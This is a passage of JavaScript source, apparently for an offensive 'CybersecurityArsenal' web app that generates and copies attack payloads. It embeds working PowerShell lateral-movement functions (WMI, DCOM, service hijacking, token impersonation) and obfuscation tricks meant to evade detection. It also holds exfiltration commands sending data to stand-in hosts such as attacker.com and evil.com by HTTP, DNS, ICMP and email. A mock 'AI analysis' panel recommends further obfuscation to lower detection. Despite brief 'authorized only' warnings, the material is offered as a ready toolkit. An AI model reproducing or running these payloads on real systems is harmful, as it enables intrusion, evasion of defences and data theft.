Write-Host "[*] Advanced Lateral Movement Techniques" -ForegroundColor Cyan

# SMB Share Enumeration with Advanced Techniques
Write-Host "\\n[+] Advanced SMB Enumeration..." -ForegroundColor Yellow
$targets = @("192.168.1.1", "192.168.1.10", "192.168.1.100")

foreach ($target in $targets) {
    Write-Host "Scanning target: $target" -ForegroundColor Green
    
    # Test SMB connectivity
    try {
        $shares = Get-SmbShare -CimSession $target -ErrorAction SilentlyContinue
        if ($shares) {
            Write-Host "  Available shares on $target:" -ForegroundColor Cyan
            $shares | Format-Table Name, Path, Description -AutoSize
        }
    } catch {
        Write-Host "  SMB access failed for $target" -ForegroundColor Red
    }
}

# PsExec-style Remote Execution
Write-Host "\\n[+] Remote Command Execution Framework..." -ForegroundColor Yellow
$remoteExec = @"
function Invoke-RemoteCommand {
    param(
        [string]$ComputerName,
        [string]$Command,
        [System.Management.Automation.PSCredential]$Credential
    )
    
    try {
        \$session = New-PSSession -ComputerName \$ComputerName -Credential \$Credential
        \$result = Invoke-Command -Session \$session -ScriptBlock { 
            param(\$cmd) 
            Invoke-Expression \$cmd 
        } -ArgumentList \$Command
        Remove-PSSession \$session
        return \$result
    } catch {
        Write-Error "Remote execution failed: \$_"
    }
}
"@

Invoke-Expression $remoteExec
Write-Host "Remote execution function loaded" -ForegroundColor Green

# WMI Lateral Movement
Write-Host "\\n[+] WMI-based Lateral Movement..." -ForegroundColor Yellow
$wmiLateral = @"
function Invoke-WMICommand {
    param(
        [string]$ComputerName,
        [string]$Command
    )
    
    try {
        \$processStartup = ([wmiclass]"\\\\$ComputerName\\root\\cimv2:Win32_ProcessStartup").CreateInstance()
        \$processStartup.ShowWindow = 0
        
        \$process = Get-WmiObject -Class Win32_Process -ComputerName \$ComputerName
        \$result = \$process.Create(\$Command, null, \$processStartup)
        
        if (\$result.ReturnValue -eq 0) {
            Write-Host "Command executed successfully on \$ComputerName" -ForegroundColor Green
            Write-Host "Process ID: \$(\$result.ProcessId)" -ForegroundColor Cyan
        } else {
            Write-Host "Command execution failed. Return code: \$(\$result.ReturnValue)" -ForegroundColor Red
        }
    } catch {
        Write-Error "WMI execution failed: \$_"
    }
}
"@

Invoke-Expression $wmiLateral
Write-Host "WMI lateral movement function loaded" -ForegroundColor Green

# DCOM Lateral Movement
Write-Host "\\n[+] DCOM-based Lateral Movement..." -ForegroundColor Yellow
$dcomLateral = @"
function Invoke-DCOMCommand {
    param(
        [string]$ComputerName,
        [string]$Command
    )
    
    try {
        \$dcomObject = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", \$ComputerName))
        \$dcomObject.Document.ActiveView.ExecuteShellCommand(\$Command, \$null, \$null, "7")
        Write-Host "DCOM command executed on \$ComputerName" -ForegroundColor Green
    } catch {
        Write-Error "DCOM execution failed: \$_"
    }
}
"@

Invoke-Expression $dcomLateral
Write-Host "DCOM lateral movement function loaded" -ForegroundColor Green

# Token Impersonation for Lateral Movement
Write-Host "\\n[+] Token Impersonation Setup..." -ForegroundColor Yellow
$tokenImpersonation = @"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
"@

try {
    Invoke-Expression $tokenImpersonation
    Write-Host "Token manipulation functions loaded" -ForegroundColor Green
} catch {
    Write-Host "Token manipulation setup failed" -ForegroundColor Red
}

# Registry-based Lateral Movement
Write-Host "\\n[+] Registry Remote Access..." -ForegroundColor Yellow
$registryAccess = @"
function Access-RemoteRegistry {
    param(
        [string]$ComputerName,
        [string]$RegistryPath
    )
    
    try {
        \$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', \$ComputerName)
        \$key = \$reg.OpenSubKey(\$RegistryPath)
        
        if (\$key) {
            Write-Host "Registry access successful on \$ComputerName" -ForegroundColor Green
            \$key.GetValueNames() | ForEach-Object {
                Write-Host "  \$_: \$(\$key.GetValue(\$_))" -ForegroundColor Cyan
            }
            \$key.Close()
        }
        \$reg.Close()
    } catch {
        Write-Error "Registry access failed: \$_"
    }
}
"@

Invoke-Expression $registryAccess
Write-Host "Registry access function loaded" -ForegroundColor Green

# Service-based Lateral Movement
Write-Host "\\n[+] Service-based Remote Execution..." -ForegroundColor Yellow
$serviceExecution = @"
function Invoke-ServiceCommand {
    param(
        [string]$ComputerName,
        [string]$ServiceName,
        [string]$BinaryPath
    )
    
    try {
        \$service = Get-WmiObject -Class Win32_Service -ComputerName \$ComputerName -Filter "Name='\$ServiceName'"
        
        if (\$service) {
            \$result = \$service.Change(\$null, \$BinaryPath)
            if (\$result.ReturnValue -eq 0) {
                \$service.StartService()
                Write-Host "Service \$ServiceName modified and started on \$ComputerName" -ForegroundColor Green
            }
        } else {
            # Create new service
            \$newService = ([wmiclass]"\\\\$ComputerName\\root\\cimv2:Win32_Service").Create(\$BinaryPath, \$ServiceName, \$ServiceName)
            if (\$newService.ReturnValue -eq 0) {
                Write-Host "Service \$ServiceName created on \$ComputerName" -ForegroundColor Green
            }
        }
    } catch {
        Write-Error "Service execution failed: \$_"
    }
}
"@

Invoke-Expression $serviceExecution
Write-Host "Service execution function loaded" -ForegroundColor Green

Write-Host "\\n[*] Lateral Movement Framework Loaded" -ForegroundColor Cyan
Write-Host "[WARNING] Use only on authorized systems!" -ForegroundColor Red

# Usage examples
Write-Host "\\n[+] Usage Examples:" -ForegroundColor Yellow
Write-Host "  Invoke-RemoteCommand -ComputerName 'target' -Command 'whoami' -Credential \$cred" -ForegroundColor Cyan
Write-Host "  Invoke-WMICommand -ComputerName 'target' -Command 'calc.exe'" -ForegroundColor Cyan
Write-Host "  Invoke-DCOMCommand -ComputerName 'target' -Command 'notepad.exe'" -ForegroundColor Cyan`,
                description: "Advanced Windows lateral movement techniques including WMI, DCOM, and service-based execution.",
                complexity: "expert",
                platform: "windows",
                type: "powershell",
                category: "Lateral Movement",
                tags: ["wmi-execution", "dcom", "service-execution", "token-impersonation"],
                mitre_id: "T1021"
            },

            powershell_obfuscation: {
                command: `# PowerShell Obfuscation Techniques
Write-Host "[*] PowerShell Obfuscation Examples" -ForegroundColor Cyan

# Base64 Encoding
$command = "Write-Host 'Hello World'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
Write-Host "Base64 Encoded: $encoded" -ForegroundColor Yellow
Write-Host "Execute with: powershell -EncodedCommand $encoded" -ForegroundColor Green

# String concatenation
Write-Host "\`nString Concatenation:" -ForegroundColor Yellow
$s1 = "Write"
$s2 = "Host"
$cmd = $s1 + "-" + $s2
Write-Host "Command: & $cmd 'Obfuscated'" -ForegroundColor Green

# Character substitution
Write-Host "\`nCharacter Substitution:" -ForegroundColor Yellow
$obf = "Wr1te-H0st".Replace("1","i").Replace("0","o")
Write-Host "Deobfuscated: $obf" -ForegroundColor Green

# Environment variables
Write-Host "\`nEnvironment Variables:" -ForegroundColor Yellow
$env:cmd = "Get-Process"
Write-Host "Hidden in env: Invoke-Expression \`$env:cmd" -ForegroundColor Green

# Splatting
Write-Host "\`nSplatting:" -ForegroundColor Yellow
$params = @{
    Object = "Splatted command"
    ForegroundColor = "Red"
}
Write-Host "Write-Host @params" -ForegroundColor Green

# Character codes
Write-Host "\`nCharacter Codes:" -ForegroundColor Yellow
$chars = [char]87 + [char]114 + [char]105 + [char]116 + [char]101 + [char]45 + [char]72 + [char]111 + [char]115 + [char]116
Write-Host "Decoded: $chars" -ForegroundColor Green

# Compression
Write-Host "\`nCompression Example:" -ForegroundColor Yellow
$original = "Get-Process | Format-Table"
$bytes = [Text.Encoding]::UTF8.GetBytes($original)
$compressed = [IO.Compression.GZipStream]::new([IO.MemoryStream]$bytes, [IO.Compression.CompressionMode]::Compress)
Write-Host "Original length: $($original.Length)" -ForegroundColor Green
Write-Host "Use compression for large payloads" -ForegroundColor Green

Write-Host "\`n[INFO] These techniques help evade static analysis" -ForegroundColor Cyan`,
                description: "Various PowerShell obfuscation techniques for evading detection and static analysis.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Defense Evasion",
                tags: ["obfuscation", "encoding", "evasion"],
                mitre_id: "T1027"
            },

            data_exfiltration: {
                command: `# Data Exfiltration Methods
Write-Host "[*] Data Exfiltration Techniques" -ForegroundColor Red
Write-Host "[WARNING] For authorized testing only!" -ForegroundColor Yellow

# Find interesting files
Write-Host "\`nFile Discovery:" -ForegroundColor Green
$files = Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.doc,*.pdf -ErrorAction SilentlyContinue | 
    Where-Object {$_.Length -lt 1MB} | Select-Object -First 10
$files | Format-Table Name, Length, LastWriteTime

# HTTP Exfiltration
Write-Host "\`nHTTP Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$data = Get-Content "sensitive.txt" -Raw' -ForegroundColor Cyan
Write-Host '$body = @{ data = $data }' -ForegroundColor Cyan  
Write-Host 'Invoke-RestMethod -Uri "http://attacker.com/upload" -Method POST -Body $body' -ForegroundColor Cyan

# DNS Exfiltration
Write-Host "\`nDNS Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$data = "sensitive information"' -ForegroundColor Cyan
Write-Host '$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))' -ForegroundColor Cyan
Write-Host 'nslookup "$encoded.attacker-domain.com"' -ForegroundColor Cyan

# ICMP Exfiltration
Write-Host "\`nICMP Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$ping = New-Object System.Net.NetworkInformation.Ping' -ForegroundColor Cyan
Write-Host '$data = [Text.Encoding]::UTF8.GetBytes("secret")' -ForegroundColor Cyan
Write-Host '$ping.Send("attacker-ip", 1000, $data)' -ForegroundColor Cyan

# Registry hiding
Write-Host "\`nRegistry Data Hiding:" -ForegroundColor Yellow
Write-Host '$data = "hidden data"' -ForegroundColor Cyan
Write-Host '$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))' -ForegroundColor Cyan
Write-Host 'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion" -Name "Cache" -Value $encoded' -ForegroundColor Cyan

# Email exfiltration
Write-Host "\`nEmail Exfiltration Example:" -ForegroundColor Yellow
Write-Host '$smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)' -ForegroundColor Cyan
Write-Host '$smtp.EnableSsl = $true' -ForegroundColor Cyan
Write-Host '$message = New-Object Net.Mail.MailMessage("sender@domain.com", "attacker@evil.com", "Data", $data)' -ForegroundColor Cyan

Write-Host "\`n[CRITICAL] Unauthorized data exfiltration is illegal!" -ForegroundColor Red`,
                description: "Various data exfiltration techniques including HTTP, DNS, ICMP, and covert channels.",
                complexity: "expert",
                platform: "windows",
                type: "powershell",
                category: "Data Exfiltration",
                tags: ["exfiltration", "data-theft", "covert-channels"],
                mitre_id: "T1041"
            }
        };
    }

    setupEventListeners() {
        try {
            // Navigation
            document.querySelectorAll('.nav-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    const section = e.target.dataset.section;
                    if (section) {
                        this.loadSection(section);
                    }
                });
            });

            // Search
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.addEventListener('input', (e) => this.performSearch(e.target.value));
            }

            // Filter toggle
            const filterBtn = document.getElementById('filterBtn');
            if (filterBtn) {
                filterBtn.addEventListener('click', () => this.toggleFilters());
            }

            // Theme toggle
            const themeToggle = document.getElementById('themeToggle');
            if (themeToggle) {
                themeToggle.addEventListener('click', () => this.toggleTheme());
            }

            // AI search
            const aiSearchBtn = document.getElementById('aiSearchBtn');
            if (aiSearchBtn) {
                aiSearchBtn.addEventListener('click', () => this.performAISearch());
            }

            // Settings
            const settingsBtn = document.getElementById('settingsBtn');
            if (settingsBtn) {
                settingsBtn.addEventListener('click', () => this.openSettings());
            }

            // Mobile menu toggle
            const menuToggle = document.getElementById('menuToggle');
            if (menuToggle) {
                menuToggle.addEventListener('click', () => this.toggleMobileMenu());
            }

            // Modal close handlers
            document.addEventListener('click', (e) => {
                if (e.target.classList.contains('modal')) {
                    this.closeModal();
                    this.closeSettings();
                }
            });

            console.log('Event listeners setup complete');
        } catch (error) {
            console.error('Failed to setup event listeners:', error);
        }
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        this.currentSection = sectionId;
        
        // Add loading state to navigation
        if (navItem) {
            const originalText = navItem.textContent;
            navItem.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${originalText}`;
            
            setTimeout(() => {
                navItem.textContent = originalText;
                this.generateSectionContent(sectionId);
            }, 300);
        } else {
            this.generateSectionContent(sectionId);
        }
    }

    generateSectionContent(sectionId) {
        try {
            this.showLoadingIndicator('Loading section content...');
            const contentSections = document.querySelector('.content-sections');
            if (!contentSections) {
                console.error('Content sections container not found');
                this.hideLoadingIndicator();
                return;
            }

            contentSections.innerHTML = '';

            const section = document.createElement('div');
            section.className = 'content-section active';
            section.id = sectionId;

            const sectionHeader = this.createSectionHeader(sectionId);
            const payloadGrid = document.createElement('div');
            payloadGrid.className = 'payload-grid';

            section.appendChild(sectionHeader);
            section.appendChild(payloadGrid);
            contentSections.appendChild(section);

            // Add timeout to ensure DOM is ready
            setTimeout(() => {
                this.populateSection(sectionId, payloadGrid);
                this.hideLoadingIndicator();
                console.log(`Section ${sectionId} loaded successfully`);
            }, 100);
        } catch (error) {
            console.error('Failed to generate section content:', error);
            this.hideLoadingIndicator();
            this.showNotification('Failed to load section content', 'error');
        }
    }

    createSectionHeader(sectionId) {
        const header = document.createElement('div');
        header.className = 'section-header';
        header.innerHTML = `
            <h2><i class="${this.getSectionIcon(sectionId)}"></i> ${this.formatTitle(sectionId)}</h2>
            <div class="section-actions">
                <span class="section-count">0 techniques</span>
            </div>
        `;
        return header;
    }

    populateSection(sectionId, container) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);

        if (sectionPayloads.length === 0) {
            const noPayloads = document.createElement('div');
            noPayloads.className = 'no-payloads';
            noPayloads.innerHTML = `
                <div class="no-payloads-content">
                    <i class="fas fa-info-circle"></i>
                    <h3>No techniques available</h3>
                    <p>This section is currently being developed. Check back soon for new content!</p>
                </div>
            `;
            container.appendChild(noPayloads);
        } else {
            sectionPayloads.forEach(([key, payload]) => {
                const card = this.createPayloadCard(key, payload);
                container.appendChild(card);
            });
        }

        const countElement = document.querySelector(`#${sectionId} .section-count`);
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;
        card.dataset.type = payload.type;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    <span class="platform-badge">${payload.platform}</span>
                    <span class="type-badge">${payload.type}</span>
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="category-tag">${payload.category}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-rocket"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.copyToClipboard('${key}')">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        return card;
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = {
            // AI-Powered sections
            ai_generation: ['system_info', 'powershell_obfuscation', 'advanced_windows_evasion'],
            ai_analysis: ['credential_dump', 'privilege_escalation', 'network_scan'],
            ai_evasion: ['advanced_windows_evasion', 'powershell_obfuscation'],
            
            // Reconnaissance
            basic: ['system_info', 'network_scan', 'linux_enumeration'],
            network: ['network_scan', 'windows_lateral_movement'],
            osint: ['system_info', 'credential_dump'],
            
            // File Operations
            filesystem: ['data_exfiltration'],
            steganography: ['data_exfiltration'],
            forensics: ['system_info', 'linux_enumeration'],
            
            // Defense Evasion
            edr: ['advanced_windows_evasion', 'powershell_obfuscation'],
            av_bypass: ['advanced_windows_evasion', 'powershell_obfuscation'],
            obfuscation: ['powershell_obfuscation'],
            
            // Advanced Techniques
            memory: ['windows_lateral_movement', 'advanced_windows_evasion'],
            kernel: ['linux_privilege_escalation', 'linux_rootkit_techniques'],
            hardware: ['system_info'],
            
            // Command & Control
            c2: ['windows_lateral_movement', 'data_exfiltration'],
            covert: ['data_exfiltration', 'powershell_obfuscation'],
            tunneling: ['network_scan', 'windows_lateral_movement'],
            
            // Persistence
            persistence: ['persistence_registry', 'windows_persistence_advanced'],
            rootkit: ['linux_rootkit_techniques'],
            bootkit: ['linux_rootkit_techniques'],
            
            // Privilege Escalation
            privilege: ['privilege_escalation', 'linux_privilege_escalation'],
            token: ['advanced_windows_evasion', 'windows_lateral_movement'],
            exploit: ['privilege_escalation', 'linux_privilege_escalation'],
            
            // Lateral Movement
            lateral: ['windows_lateral_movement'],
            pivoting: ['windows_lateral_movement', 'network_scan'],
            domain: ['windows_lateral_movement', 'credential_dump'],
            
            // Exfiltration
            exfiltration: ['data_exfiltration'],
            dns_exfil: ['data_exfiltration'],
            cloud_exfil: ['data_exfiltration'],
            
            // Custom Tools
            custom: Object.keys(this.payloads),
            automation: ['powershell_obfuscation', 'advanced_windows_evasion'],
            framework: Object.keys(this.payloads)
        };

        const payloadKeys = sectionMap[sectionId] || Object.keys(this.payloads);
        return payloadKeys.map(key => [key, this.payloads[key]]).filter(([key, payload]) => payload);
    }

    generatePayload(type) {
        const payload = this.payloads[type];
        if (!payload) {
            this.showNotification('Payload not found', 'error');
            return;
        }

        this.showLoadingIndicator('Generating payload...');
        
        // Simulate processing time for realistic loading
        setTimeout(() => {
            this.showOutput(type, payload);
            this.addToHistory(type, payload);
            this.hideLoadingIndicator();
            this.showNotification(`Generated "${this.formatTitle(type)}" successfully!`, 'success');
        }, 500);
    }

    showOutput(type, payload) {
        const outputPanel = document.getElementById('outputPanel');
        if (!outputPanel) return;

        outputPanel.classList.add('active');

        const payloadOutput = document.getElementById('payloadOutput');
        if (payloadOutput) {
            payloadOutput.textContent = payload.command;
        }

        this.updateMetadataTab(type, payload);
    }

    updateMetadataTab(type, payload) {
        const metadataContent = document.getElementById('metadataContent');
        if (!metadataContent) return;

        metadataContent.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Technique:</strong> ${this.formatTitle(type)}
                </div>
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Type:</strong> ${payload.type}
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
            </div>
        `;
    }

    copyToClipboard(type) {
        const payload = this.payloads[type];
        if (!payload) return;

        navigator.clipboard.writeText(payload.command).then(() => {
            this.showNotification('Copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy to clipboard', 'error');
        });
    }

    toggleFavorite(type) {
        const index = this.favorites.indexOf(type);
        if (index > -1) {
            this.favorites.splice(index, 1);
        } else {
            this.favorites.push(type);
        }
        localStorage.setItem('favorites', JSON.stringify(this.favorites));
        this.generateSectionContent(this.currentSection);
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;

        cards.forEach(card => {
            const title = card.querySelector('h3')?.textContent.toLowerCase() || '';
            const description = card.querySelector('.card-description')?.textContent.toLowerCase() || '';
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());

            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));

            if (matchesSearch) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    toggleFilters() {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        localStorage.setItem('theme', this.currentTheme);

        const icon = document.querySelector('#themeToggle i');
        if (icon) {
            icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    performAISearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            const query = searchInput.value;
            if (!query.trim()) {
                this.showNotification('Please enter a search query', 'warning');
                return;
            }
            
            this.showLoadingIndicator('AI is processing your search...');
            this.showNotification(`AI searching for: "${query}"`, 'info');
            
            setTimeout(() => {
                this.performSearch(query);
                this.hideLoadingIndicator();
                this.showNotification('AI search completed', 'success');
            }, 1500);
        }
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            payload: payload.command,
            timestamp: new Date().toISOString(),
            description: payload.description
        };

        this.payloadHistory.unshift(historyItem);
        if (this.payloadHistory.length > 100) {
            this.payloadHistory = this.payloadHistory.slice(0, 100);
        }

        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    updateStats() {
        const totalPayloads = document.getElementById('totalPayloads');
        if (totalPayloads) {
            totalPayloads.textContent = `${Object.keys(this.payloads).length}+ Techniques`;
        }
    }

    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${this.getNotificationIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        container.appendChild(notification);
        setTimeout(() => notification.classList.add('show'), 100);
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (container.contains(notification)) {
                    container.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }

    showLoadingIndicator(message = 'Loading...') {
        const indicator = document.getElementById('loadingIndicator');
        const text = document.getElementById('loadingText');
        if (indicator && text) {
            text.textContent = message;
            indicator.style.display = 'flex';
            indicator.classList.add('active');
        }
    }

    hideLoadingIndicator() {
        const indicator = document.getElementById('loadingIndicator');
        if (indicator) {
            indicator.classList.remove('active');
            setTimeout(() => {
                indicator.style.display = 'none';
            }, 300);
        }
    }

    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    getSectionIcon(sectionId) {
        const icons = {
            basic: 'fas fa-info-circle',
            network: 'fas fa-network-wired',
            filesystem: 'fas fa-folder',
            edr: 'fas fa-shield-alt',
            persistence: 'fas fa-anchor',
            privilege: 'fas fa-arrow-up',
            credentials: 'fas fa-key',
            exfiltration: 'fas fa-upload',
            linux: 'fab fa-linux'
        };
        return icons[sectionId] || 'fas fa-cog';
    }

    toggleMobileMenu() {
        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.toggle('active');
        }
    }

    openSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.add('active');
        }
    }

    closeSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    closeOutput() { 
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) outputPanel.classList.remove('active');
    }

    closeModal() {
        const modal = document.getElementById('detailsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    initializeTabSwitching() {
        // Initialize output panel tabs
        const outputTabs = document.querySelectorAll('.output-tab');
        const tabContents = document.querySelectorAll('.tab-content');

        outputTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const targetTab = tab.dataset.tab;
                
                // Remove active class from all tabs and contents
                outputTabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(content => content.classList.remove('active'));
                
                // Add active class to clicked tab
                tab.classList.add('active');
                
                // Show corresponding content
                const targetContent = document.getElementById(targetTab + 'Tab');
                if (targetContent) {
                    targetContent.classList.add('active');
                }
            });
        });
    }

    beautifyCode() {
        this.showNotification('Code beautification applied!', 'success');
    }

    analyzePayload() {
        const analysisContent = document.getElementById('analysisContent');
        if (analysisContent) {
            analysisContent.innerHTML = `
                <div class="analysis-loading">
                    <i class="fas fa-brain fa-spin"></i>
                    <span>AI is analyzing the payload...</span>
                </div>
            `;
        }
        
        this.showNotification('AI analysis started...', 'info');
        
        // Simulate AI analysis
        setTimeout(() => {
            if (analysisContent) {
                analysisContent.innerHTML = `
                    <div class="analysis-result">
                        <h4>AI Analysis Results</h4>
                        <div class="analysis-section">
                            <h5>Security Assessment</h5>
                            <p>This payload has been analyzed for potential security implications and evasion capabilities.</p>
                        </div>
                        <div class="analysis-section">
                            <h5>Detection Probability</h5>
                            <div class="detection-meter">
                                <div class="meter-bar" style="width: 30%; background: #10b981;"></div>
                            </div>
                            <span>Low detection probability (30%)</span>
                        </div>
                        <div class="analysis-section">
                            <h5>Recommendations</h5>
                            <ul>
                                <li>Consider additional obfuscation techniques</li>
                                <li>Test in isolated environment first</li>
                                <li>Ensure proper authorization before use</li>
                            </ul>
                        </div>
                    </div>
                `;
            }
            this.showNotification('AI analysis completed!', 'success');
        }, 3000);
    }

    downloadPayload() {
        this.showNotification('Payload downloaded!', 'success');
    }

    sharePayload() {
        this.showNotification('Payload shared!', 'success');
    }

    clearSelection() {
        this.showNotification('Selection cleared!', 'info');
    }

    generateBulkPayloads() {
        const selectedCount = document.getElementById('selectedCount');
        const count = selectedCount ? parseInt(selectedCount.textContent) : 0;
        
        if (count === 0) {
            this.showNotification('No payloads selected for bulk generation', 'warning');
            return;
        }
        
        this.showLoadingIndicator(`Generating ${count} payloads...`);
        this.showNotification('Bulk generation started!', 'info');
        
        // Simulate bulk generation process
        setTimeout(() => {
            this.hideLoadingIndicator();
            this.showNotification(`Successfully generated ${count} payloads!`, 'success');
        }, 2000);
    }

    toggleAI() {
        const panel = document.getElementById('aiPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }

    toggleFilters() {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    try {
        console.log('DOM loaded, initializing application...');
        window.app = new CybersecurityArsenal();
        
        // Additional initialization after a brief delay to ensure all elements are ready
        setTimeout(() => {
            if (window.app && typeof window.app.updateStats === 'function') {
                window.app.updateStats();
            }
        }, 100);
        
    } catch (error) {
        console.error('Failed to initialize application:', error);
        
        // Show error message to user
        const errorDiv = document.createElement('div');
        errorDiv.innerHTML = `
            <div style="
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ef4444;
                color: white;
                padding: 16px;
                border-radius: 8px;
                z-index: 9999;
                max-width: 400px;
            ">
                <strong>Error:</strong> Failed to load application. Please refresh the page.
            </div>
        `;
        document.body.appendChild(errorDiv);
    }
});
